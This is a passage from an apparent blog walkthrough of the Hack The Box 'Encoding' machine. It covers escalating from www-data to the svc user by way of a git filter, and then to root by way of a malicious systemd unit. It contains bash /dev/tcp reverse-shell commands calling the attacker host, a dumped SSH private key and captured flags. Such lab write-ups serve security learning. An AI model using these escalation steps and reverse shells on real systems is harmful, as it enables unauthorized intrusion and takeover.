</span></span><span class=line><span class=cl>drwxr-x---  <span class=m>5</span> svc  svc  <span class=m>4096</span> Jan <span class=m>23</span> 18:23 svc
</span></span><span class=line><span class=cl>www-data@encoding:~/image/actions$ cat /home/svc/user.txt
</span></span><span class=line><span class=cl>cat /home/svc/user.txt
</span></span><span class=line><span class=cl>cat: /home/svc/user.txt: Permission denied
</span></span></code></pre></td></tr></table></div></div><p>We don&rsquo;t have the user flag yet, but we have a reverse shell! It&rsquo;s also worth mentioning here I had to try a few PHP reverse shells encoded as PHP filters before the above worked. There&rsquo;s a lot of trial and error that I don&rsquo;t include in write ups for brevity.</p><p>Are we able to run anything as <code>sudo</code> with the www-data user?:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@encoding:~/image/actions$ sudo -l
</span></span><span class=line><span class=cl>sudo -l
</span></span><span class=line><span class=cl>Matching Defaults entries <span class=k>for</span> www-data on encoding:
</span></span><span class=line><span class=cl>    env_reset, mail_badpass,
</span></span><span class=line><span class=cl>    <span class=nv>secure_path</span><span class=o>=</span>/usr/local/sbin<span class=se>\:</span>/usr/local/bin<span class=se>\:</span>/usr/sbin<span class=se>\:</span>/usr/bin<span class=se>\:</span>/sbin<span class=se>\:</span>/bin<span class=se>\:</span>/snap/bin,
</span></span><span class=line><span class=cl>    use_pty
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>User www-data may run the following commands on encoding:
</span></span><span class=line><span class=cl>    <span class=o>(</span>svc<span class=o>)</span> NOPASSWD: /var/www/image/scripts/git-commit.sh
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>www-data@encoding:~/image/actions$ cat /var/www/image/scripts/git-commit.sh
</span></span><span class=line><span class=cl>cat /var/www/image/scripts/git-commit.sh
</span></span><span class=line><span class=cl><span class=c1>#!/bin/bash</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>u</span><span class=o>=</span><span class=k>$(</span>/usr/bin/git --git-dir<span class=o>=</span>/var/www/image/.git  --work-tree<span class=o>=</span>/var/www/image ls-files  -o --exclude-standard<span class=k>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[[</span> <span class=nv>$u</span> <span class=o>]]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>        /usr/bin/git --git-dir<span class=o>=</span>/var/www/image/.git  --work-tree<span class=o>=</span>/var/www/image add -A
</span></span><span class=line><span class=cl><span class=k>else</span>
</span></span><span class=line><span class=cl>        /usr/bin/git --git-dir<span class=o>=</span>/var/www/image/.git  --work-tree<span class=o>=</span>/var/www/image commit -m <span class=s2>&#34;Commited from API!&#34;</span> --author<span class=o>=</span><span class=s2>&#34;james &lt;james@haxtables.htb&gt;&#34;</span>  --no-verify
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span><span class=line><span class=cl>www-data@encoding:~/image/actions$
</span></span></code></pre></td></tr></table></div></div><p>It appears we can run <code>sudo -u svc /var/www/image/scripts/git-commit.sh</code>, which will basically run <code>git ls-files</code> before adding any found unstaged files. Failing this, it will call <code>git commit -m "Committed from API!"</code> . We can&rsquo;t add files directly to <code>/var/www/image</code>, but <code>getfacl</code> shows we (www-data) have write access to the <code>.git</code> directory:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@encoding:/dev/shm$ getfacl /var/www/image/.git
</span></span><span class=line><span class=cl>getfacl: Removing leading <span class=s1>&#39;/&#39;</span> from absolute path names
</span></span><span class=line><span class=cl><span class=c1># file: var/www/image/.git</span>
</span></span><span class=line><span class=cl><span class=c1># owner: svc</span>
</span></span><span class=line><span class=cl><span class=c1># group: svc</span>
</span></span><span class=line><span class=cl>user::rwx
</span></span><span class=line><span class=cl>user:www-data:rwx
</span></span><span class=line><span class=cl>group::r-x
</span></span><span class=line><span class=cl>mask::rwx
</span></span><span class=line><span class=cl>other::r-x
</span></span></code></pre></td></tr></table></div></div><p>Initially, I tried creating a few common git hooks before running <code>sudo -u svc /var/www/image/scripts/git-commit.sh</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>echo</span> -e <span class=s1>&#39;#!/bin/sh\necho foo1&#39;</span> &gt; /var/www/image/.git/hooks/commitmsg <span class=o>&amp;&amp;</span> cat /var/www/image/.git/hooks/commitmsg
</span></span><span class=line><span class=cl>chmod +x /var/www/image/.git/hooks/commitmsg
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>echo</span> -e <span class=s1>&#39;#!/bin/sh\necho foo2&#39;</span> &gt; /var/www/image/.git/hooks/pre-commit
</span></span><span class=line><span class=cl>chmod +x /var/www/image/.git/hooks/pre-commit
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>echo</span> -e <span class=s1>&#39;#!/bin/sh\necho foo3&#39;</span> &gt; /var/www/image/.git/hooks/prepare-commit-msg
</span></span><span class=line><span class=cl>chmod +x /var/www/image/.git/hooks/prepare-commit-msg
</span></span></code></pre></td></tr></table></div></div><p>Unfortunately, this didn&rsquo;t work &ndash; and as I found out, the <code>--no-verify</code> git flag skips git commit hooks. Searching for git privilege escalation, I came across this: <a href=https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-git-privilege-escalation/ target=_blank rel="noopener noreffer">Sudo Git Privilege Escalation | Exploit Notes</a></p><p>Reading the comprehensive (and free!) ProGit book online, I came across <a href=https://git-scm.com/book/en/v2/Customizing-Git-Git-Attributes target=_blank rel="noopener noreffer">https://git-scm.com/book/en/v2/Customizing-Git-Git-Attributes</a> and particularly filters. In particular, the <code>indent</code> filter will run all your source code through the indent program before committing.</p><p>Let&rsquo;s see if this works when there&rsquo;s nothing to commit in the git repo staging area, and we run as <code>sudo</code>, while we have another reverse shell listening locally with <code>nc -lvnp 3344</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@encoding:~/image$ <span class=nb>echo</span> <span class=s1>&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.14.62/3344 0&gt;&amp;1&#34;&#39;</span> &gt; /tmp/clean
</span></span><span class=line><span class=cl>&lt;-i &gt;<span class=p>&amp;</span> /dev/tcp/10.10.14.62/3344 0&gt;<span class=p>&amp;</span>1<span class=s2>&#34;&#39; &gt; /tmp/clean
</span></span></span><span class=line><span class=cl><span class=s2>www-data@encoding:~/image</span>$<span class=s2> chmod +x /tmp/clean
</span></span></span><span class=line><span class=cl><span class=s2>chmod +x /tmp/clean
</span></span></span><span class=line><span class=cl><span class=s2>www-data@encoding:~/image</span>$<span class=s2> echo &#39;*.php filter=indent&#39; &gt; /var/www/image/.git/info/attributes
</span></span></span><span class=line><span class=cl><span class=s2>&lt;ilter=indent&#39; &gt; /var/www/image/.git/info/attributes
</span></span></span><span class=line><span class=cl><span class=s2>www-data@encoding:~/image</span>$<span class=s2> cd /tmp
</span></span></span><span class=line><span class=cl><span class=s2>cd /tmp
</span></span></span><span class=line><span class=cl><span class=s2>www-data@encoding:/tmp</span>$<span class=s2> git --git-dir=/var/www/image/.git --work-tree=/var/www/image config filter.indent.clean /tmp/clean
</span></span></span><span class=line><span class=cl><span class=s2>&lt;var/www/image config filter.indent.clean /tmp/clean
</span></span></span><span class=line><span class=cl><span class=s2>www-data@encoding:/tmp</span>$<span class=s2> sudo -u svc /var/www/image/scripts/git-commit.sh
</span></span></span><span class=line><span class=cl><span class=s2>sudo -u svc /var/www/image/scripts/git-commit.sh
</span></span></span></code></pre></td></tr></table></div></div><p>You&rsquo;ll notice the output is a little wonky, probably because I struggled to upgrade to a fully interactive TTY. So above we created our reverse shell in <code>/tmp/clean</code> marking it executable. We apply the <code>indent</code> filter to <code>*.php</code> files, and we set the git repo&rsquo;s config to point to our <code>/tmp/clean</code> script for the indent filter. Then we run the git script. Back in our reverse shell:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$nc</span> -lvnp <span class=m>3344</span>
</span></span><span class=line><span class=cl>Listening on 0.0.0.0 <span class=m>3344</span>
</span></span><span class=line><span class=cl>Connection received on 10.10.11.198 <span class=m>56308</span>
</span></span><span class=line><span class=cl>bash: cannot <span class=nb>set</span> terminal process group <span class=o>(</span>783<span class=o>)</span>: Inappropriate ioctl <span class=k>for</span> device
</span></span><span class=line><span class=cl>bash: no job control in this shell
</span></span><span class=line><span class=cl>svc@encoding:/var/www/image$ ls -la /home/svc
</span></span><span class=line><span class=cl>ls -la /home/svc
</span></span><span class=line><span class=cl>total <span class=m>40</span>
</span></span><span class=line><span class=cl>drwxr-x--- <span class=m>5</span> svc  svc  <span class=m>4096</span> Jan <span class=m>23</span> 18:23 .
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>3</span> root root <span class=m>4096</span> Jan <span class=m>13</span> 16:25 ..
</span></span><span class=line><span class=cl>lrwxrwxrwx <span class=m>1</span> svc  svc     <span class=m>9</span> Nov <span class=m>11</span> 14:31 .bash_history -&gt; /dev/null
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> svc  svc   <span class=m>220</span> Jan  <span class=m>6</span>  <span class=m>2022</span> .bash_logout
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> svc  svc  <span class=m>3771</span> Jan  <span class=m>6</span>  <span class=m>2022</span> .bashrc
</span></span><span class=line><span class=cl>drwx------ <span class=m>3</span> svc  svc  <span class=m>4096</span> Jan <span class=m>13</span> 16:25 .cache
</span></span><span class=line><span class=cl>-rw-rw-r-- <span class=m>1</span> svc  svc    <span class=m>85</span> Nov  <span class=m>8</span> 16:37 .gitconfig
</span></span><span class=line><span class=cl>drwx------ <span class=m>3</span> svc  svc  <span class=m>4096</span> Jan <span class=m>13</span> 16:25 .gnupg
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> svc  svc   <span class=m>807</span> Jan  <span class=m>6</span>  <span class=m>2022</span> .profile
</span></span><span class=line><span class=cl>drwx------ <span class=m>2</span> svc  svc  <span class=m>4096</span> Jan <span class=m>13</span> 16:25 .ssh
</span></span><span class=line><span class=cl>-rw-r----- <span class=m>1</span> root svc    <span class=m>33</span> Apr  <span class=m>7</span> 04:19 user.txt
</span></span><span class=line><span class=cl>svc@encoding:/var/www/image$ cat /home/svc/user.txt
</span></span><span class=line><span class=cl>cat /home/svc/user.txt
</span></span><span class=line><span class=cl>35560e566cec288d1c3217b0cd2a9023
</span></span><span class=line><span class=cl>svc@encoding:/var/www/image$ cat /home/svc/.ssh/id_rsa
</span></span><span class=line><span class=cl>cat /home/svc/.ssh/id_rsa
</span></span><span class=line><span class=cl>-----BEGIN OPENSSH PRIVATE KEY-----
</span></span><span class=line><span class=cl>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
</span></span><span class=line><span class=cl>NhAAAAAwEAAQAAAYEAlnPbNrAswX0YLnW3sx1l7WN42hTFVwWISqdx5RUmVmXbdVgDXdzH
</span></span><span class=line><span class=cl>/ZBNxIqqMXE8DWyNpzcV/78rkU4f2FF/rWH26WfFmaI/Zm9sGd5l4NTON2lxAOt+8aUyBR
</span></span><span class=line><span class=cl>xpVYNSSK+CkahQ2XDO87IyS4HV4cKUYpaN/efa+XyoUm6mKiHUbtyUYGAfebSVxU4ur1Ue
</span></span><span class=line><span class=cl>vSquljs+Hcpzh5WKRhgu/ojBDQdKWd0Q6bn75TfRBSu6u/mODjjilvVppGNWJWNrar8eSZ
</span></span><span class=line><span class=cl>vbqMlV509E6Ud2rNopMelmpESZfBEGoJAvEnhFaYylsuC7IPEWMi82/3Vyl7RAgeT0zPjq
</span></span><span class=line><span class=cl>nHiPCJykLYvxkvsRnIBFxesZL+AkbHYHEn3fyH16Pp8ZZmIIJN3WQD/SRJOTDh/fmWy6r7
</span></span><span class=line><span class=cl>oD+urq6+rEqTV0UGDk3YXhhep/LYnszZAZ2HNainM+iwtpDTr3rw+B+OH6Z8Zla1YvBFvL
</span></span><span class=line><span class=cl>oQOAsqE2FUHeEpRspb57uDeKWbkrNLU5cYUhuWBLAAAFiEyJeU9MiXlPAAAAB3NzaC1yc2
</span></span><span class=line><span class=cl>EAAAGBAJZz2zawLMF9GC51t7MdZe1jeNoUxVcFiEqnceUVJlZl23VYA13cx/2QTcSKqjFx
</span></span><span class=line><span class=cl>PA1sjac3Ff+/K5FOH9hRf61h9ulnxZmiP2ZvbBneZeDUzjdpcQDrfvGlMgUcaVWDUkivgp
</span></span><span class=line><span class=cl>GoUNlwzvOyMkuB1eHClGKWjf3n2vl8qFJupioh1G7clGBgH3m0lcVOLq9VHr0qrpY7Ph3K
</span></span><span class=line><span class=cl>c4eVikYYLv6IwQ0HSlndEOm5++U30QUrurv5jg444pb1aaRjViVja2q/Hkmb26jJVedPRO
</span></span><span class=line><span class=cl>lHdqzaKTHpZqREmXwRBqCQLxJ4RWmMpbLguyDxFjIvNv91cpe0QIHk9Mz46px4jwicpC2L
</span></span><span class=line><span class=cl>8ZL7EZyARcXrGS/gJGx2BxJ938h9ej6fGWZiCCTd1kA/0kSTkw4f35lsuq+6A/rq6uvqxK
</span></span><span class=line><span class=cl>k1dFBg5N2F4YXqfy2J7M2QGdhzWopzPosLaQ06968Pgfjh+mfGZWtWLwRby6EDgLKhNhVB
</span></span><span class=line><span class=cl>3hKUbKW+e7g3ilm5KzS1OXGFIblgSwAAAAMBAAEAAAGAF7nXhQ1NUYoHqTP5Ly7gpwn7wf
</span></span><span class=line><span class=cl>BqmmmN76/uPyERtahEboHdrgymIS+DhA4V/swLm1ZWFFuUhYtBNJ3sWbGof9AmHvK1b5/t
</span></span><span class=line><span class=cl>fZruojm3OTh1+LkREAMTNspFVBcB6XFXJY0/+vZfIZsvl7CvS8cC0qJbwhxZ8gOBPbzR0o
</span></span><span class=line><span class=cl>YOgDBrjrwMThJ6hDfdMos8w3uZ6Fz1wU1AY3RMucH0V09zAcLRJtvSds9s3l7tAV3HAZi+
</span></span><span class=line><span class=cl>zuvw4f9IhGPZMApWSHkf9nsIFD1miD9n31E5uFYHxF+4OIYBw+IvWoH2f3JkzWpTh845p0
</span></span><span class=line><span class=cl>VyX4+8SdEhONX7CkdprVnfeLH8+cuxhFSKE4Vlz5Zer0HvESIpMq0sHp3zcKP8wIBF30US
</span></span><span class=line><span class=cl>abakUHBmd/k4Ssw6oUg06hLm5xRI8d8kDJ2JhE9AmM4jSuW+kuHzTn/xpK+VQHVKNhASbD
</span></span><span class=line><span class=cl>EO436iRABccefgHzTTLJaUKnDQvHVT5mE5xwYdIBpchN2O8z9VgkkKt0LVtPU1HauxAAAA
</span></span><span class=line><span class=cl>wAw5Y6bFzH3wtun0gOtWfLfm6pluFtdhPivtjXNr+4kqxVfcq1vriwjzpSTiZXtDXfdvWn
</span></span><span class=line><span class=cl>BN2rpzw5l0ZCmhLBxVl+qUNQo0RWCNOC6BRm3Tfyt/FddoDkQdl83zs5ts8A6w3aAynGv3
</span></span><span class=line><span class=cl>Qrh3bR/LvxvvCGynS5iHedOBMCBl5zqgBni/EsaQuGGD6/4Vi7o2z+i1U7/EUuQ3eeJ/pi
</span></span><span class=line><span class=cl>MGXN/7r1Ey3IinPA5omtDn9FplaoljCHfRkH8XIOjxle0+sQAAAMEAvZcUrFEfQES3J8yr
</span></span><span class=line><span class=cl>DWk2ts8UL1iX4G4LqD34f7AUEtj4Jnr/D6fnl/FOSKuCK+Z4OFCh74H0mogGAOvC1bKCkD
</span></span><span class=line><span class=cl>/Q/KSdSb2x/6+EOdBPD7X/73W7kiio/phrqwARFWZRcX4PyiOeKI6h5UFPERXBOse84pqa
</span></span><span class=line><span class=cl>d01VWSE7ulFwqExaEBtF9kWlruGd/C4GmxUkCEpOsBWa1HjhrY36J99fiQDkI8F5xAfQrr
</span></span><span class=line><span class=cl>5BlTXUg4hYsAx2dA71qDV4NgvuL7QTAAAAwQDLJzsl6ZfIKEYaN1klK1tfJ+yz8Hzgn0+D
</span></span><span class=line><span class=cl>Y0RjyEuNhw2ZbIV7llFeGC7q8NfHKxuO6XQyJBBoTgZTQQSTRO3E1/i7fRB73P+++CyIt4
</span></span><span class=line><span class=cl>65ER/Evu+QPxwElDkxiQCR9p3wrMwpuR4Aq4RwxkJtZNLcE3o8TOqpxoKXEpOWKZRx52kZ
</span></span><span class=line><span class=cl>F1ul2Aqwml1hQYQGXfr+BCkEdaskZxCTdNL3U548+/SpBnh8YXYKMsH2L70JHgo940ZjYn
</span></span><span class=line><span class=cl>/aFyar4fo4+ekAAAAMc3ZjQGVuY29kaW5nAQIDBAUGBw<span class=o>==</span>
</span></span><span class=line><span class=cl>-----END OPENSSH PRIVATE KEY-----
</span></span></code></pre></td></tr></table></div></div><p>Sweet! We got a reverse shell as the <code>svc</code> user, got the user flag, plus an SSH private key to help us log in via SSH &ndash; so we get a nice interactive TTY.</p><h2 id=privilege-escalation>Privilege Escalation</h2><p>After SSHing in with <code>ssh -i id_rsa svc@haxtables.htb</code>, we see we can run <code>/usr/bin/systemctl restart *</code> as sudo:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>svc@encoding:~$ sudo -l
</span></span><span class=line><span class=cl>Matching Defaults entries <span class=k>for</span> svc on encoding:
</span></span><span class=line><span class=cl>    env_reset, mail_badpass, <span class=nv>secure_path</span><span class=o>=</span>/usr/local/sbin<span class=se>\:</span>/usr/local/bin<span class=se>\:</span>/usr/sbin<span class=se>\:</span>/usr/bin<span class=se>\:</span>/sbin<span class=se>\:</span>/bin<span class=se>\:</span>/snap/bin, use_pty
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>User svc may run the following commands on encoding:
</span></span><span class=line><span class=cl>    <span class=o>(</span>root<span class=o>)</span> NOPASSWD: /usr/bin/systemctl restart *
</span></span></code></pre></td></tr></table></div></div><p>First I tried <a href=https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks target=_blank rel="noopener noreffer">Wildcards Spare tricks</a>, but <code>systemctl</code> kept escaping my bad input. My next thought was to see if I can create a systemd unit file with a reverse shell, and restart my new service.. Let&rsquo;s see which directories are writable by this user:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>svc@encoding:/dev/shm$ find / -writable 2&gt; /dev/null
</span></span><span class=line><span class=cl>.. snip ..
</span></span><span class=line><span class=cl>/etc/systemd/user/session-migration.service
</span></span><span class=line><span class=cl>/etc/systemd/system
</span></span></code></pre></td></tr></table></div></div><p>We create a service called seashell, a reverse shell back to my machine. We copy it into <code>/etc/systemd/system</code>, and restart it:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>svc@encoding:/dev/shm$ cat seashell.service 
</span></span><span class=line><span class=cl><span class=o>[</span>Unit<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=nv>Description</span><span class=o>=</span>sea shells by thes seashore
</span></span><span class=line><span class=cl><span class=o>[</span>Service<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=nv>RemainAfterExit</span><span class=o>=</span>yes
</span></span><span class=line><span class=cl><span class=nv>Type</span><span class=o>=</span>simple
</span></span><span class=line><span class=cl><span class=nv>ExecStart</span><span class=o>=</span>/bin/bash -c <span class=s2>&#34;exec 5&lt;&gt;/dev/tcp/10.10.14.62/3322; cat &lt;&amp;5 | while read line; do </span><span class=nv>$line</span><span class=s2> 2&gt;&amp;5 &gt;&amp;5; done&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>Install<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=nv>WantedBy</span><span class=o>=</span>default.target
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>svc@encoding:/dev/shm$ cp seashell.service /etc/systemd/system
</span></span><span class=line><span class=cl>svc@encoding:/dev/shm$ sudo -u root /usr/bin/systemctl restart seashell.service
</span></span></code></pre></td></tr></table></div></div><p>And back in our netcat listener, we now have a root shell, plus the root flag!:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$nc</span> -lvnp <span class=m>3322</span>
</span></span><span class=line><span class=cl>Listening on 0.0.0.0 <span class=m>3322</span>
</span></span><span class=line><span class=cl>Connection received on 10.10.11.198 <span class=m>53080</span>
</span></span><span class=line><span class=cl>id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=nb>cd</span> /root
</span></span><span class=line><span class=cl>ls
</span></span><span class=line><span class=cl>root.txt
</span></span><span class=line><span class=cl>scripts
</span></span><span class=line><span class=cl>cat root.txt
</span></span><span class=line><span class=cl>bfc3a64c2fca504300e71bc354bc9651
</span></span></code></pre></td></tr></table></div></div><p>Done!</p><h2 id=conclusion>Conclusion</h2><p>I had read about PHP filter chains a little while ago as a means of leveraging LFI to gain Remote Code Execution (LFI2RCE) &ndash; and it was quite cool to finally try it out in a somewhat real-worldish setting.</p><p>I definitely got lost along the way and back tracked a few times &ndash; log poisoning led me astray, and working towards SSRF took some time. After this though, the path was fairly obvious, particularly privesc to the service account and root.</p><p>Any valuable lessons learnt? While going deep is definitely valuable and required, I should consider approaches such as time boxing any &lsquo;bread crumbs&rsquo;, and making a decision to back track before trying something else &ndash; it&rsquo;s exceptionally easy to get caught up on an attack vector that never actually eventuates at times.</p><p>I&rsquo;m not sure of the best tool (logseq whiteboards?), but it would be cool to use a mind mapping app to track progress on CTFs and more easily see the paths tried, dead ends, etc. Speaking of tools, I might try <a href=https://github.com/t3l3machus/Villain target=_blank rel="noopener noreffer">Villain</a> next time around, as a nice session manager for shells and alternative to netcat. After seeing John Hammond demo Villain, and losing track of my open shells, it looks like the perfect tool for managing shell sessions.</p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Updated on 2023-04-15&nbsp;<a class=git-hash href=https://github.com/m-dwyer/emdwyer.github.io/commit/214a40c7e0189a99bb731827f6c93bccc9bd12ea target=_blank title="commit by m-dwyer(13535330+m-dwyer@users.noreply.github.com) 214a40c7e0189a99bb731827f6c93bccc9bd12ea: slightly improve JSON payload formatting in encoding writeup">
<i class="fas fa-hashtag fa-fw" aria-hidden=true></i>214a40c</a></span></div></div><div class=post-info-line><div class=post-info-md><span><a class=link-to-markdown href=/2023-04-15-encoding-htb/index.md target=_blank>Read Markdown</a></span></div><div class=post-info-share><span><a href=javascript:void(0); title="Share on Linkedin" data-sharer=linkedin data-url=https://emdwyer.github.io/2023-04-15-encoding-htb/><i class="fab fa-linkedin fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Hacker News" data-sharer=hackernews data-url=https://emdwyer.github.io/2023-04-15-encoding-htb/ data-title="Encoding HTB Walkthrough"><i class="fab fa-hacker-news fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Line" data-sharer=line data-url=https://emdwyer.github.io/2023-04-15-encoding-htb/ data-title="Encoding HTB Walkthrough"><i data-svg-src=https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg aria-hidden=true></i></a><a href=javascript:void(0); title="Share on 微博" data-sharer=weibo data-url=https://emdwyer.github.io/2023-04-15-encoding-htb/ data-title="Encoding HTB Walkthrough"><i class="fab fa-weibo fa-fw" aria-hidden=true></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw" aria-hidden=true></i>&nbsp;<a href=/tags/htb/>htb</a>,&nbsp;<a href=/tags/security/>security</a>,&nbsp;<a href=/tags/penetration-testing/>penetration testing</a>,&nbsp;<a href=/tags/ctf/>ctf</a>,&nbsp;<a href=/tags/php/>php</a>,&nbsp;<a href=/tags/filter/>filter</a>,&nbsp;<a href=/tags/lfi/>lfi</a>,&nbsp;<a href=/tags/ssrf/>ssrf</a>,&nbsp;<a href=/tags/git/>git</a>,&nbsp;<a href=/tags/lfi2rce/>lfi2rce</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span></section></div><div class=post-nav><a href=/2023-04-08-broscience-htb/ class=prev rel=prev title="BroScience HTB Walkthrough"><i class="fas fa-angle-left fa-fw" aria-hidden=true></i>BroScience HTB Walkthrough</a></div></div><div id=comments><div id=valine class=comment></div><noscript>Please enable JavaScript to view the comments powered by <a href=https://valine.js.org/>Valine</a>.</noscript></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2022 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ 